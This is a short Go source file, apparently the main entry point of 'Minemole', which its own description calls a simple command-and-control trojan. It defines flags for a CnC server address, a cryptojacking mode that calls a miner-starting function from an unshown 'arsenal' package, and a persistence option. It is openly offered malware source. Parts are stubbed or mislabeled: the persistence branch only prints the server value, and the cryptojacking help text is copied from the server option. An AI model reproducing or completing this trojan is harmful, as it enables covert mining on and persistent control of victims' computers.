package main

import (
    "github.com/akamensky/argparse"
    "fmt"
	"os"
	"runtime"
	arsenal "./arsenal"
)

// main.exe -t "Windows" -s "localhost" -cp

func main() {
	parser := argparse.NewParser("Minemole", "A Simple CnC Trojan made with Go.")

	server := parser.String("s", "server", &argparse.Options{Required: true, Help: "Address of the CnC server (e.g http://localhost:8080)."})
	crypto := parser.Flag("c", "cryptojacking",  &argparse.Options{Required: true, Help: "Address of the CnC server (e.g http://localhost:8080)."})
	persist := parser.Flag("p", "persistent",  &argparse.Options{Required: true, Help: "Automatically install the agent on first run."})
	err := parser.Parse(os.Args)

	if err != nil {
		fmt.Print(parser.Usage(err))
	}

	if *crypto {
		arsenal.InitMiner(runtime.GOOS)
	}
	if *persist {
		fmt.Println(server)
	}
}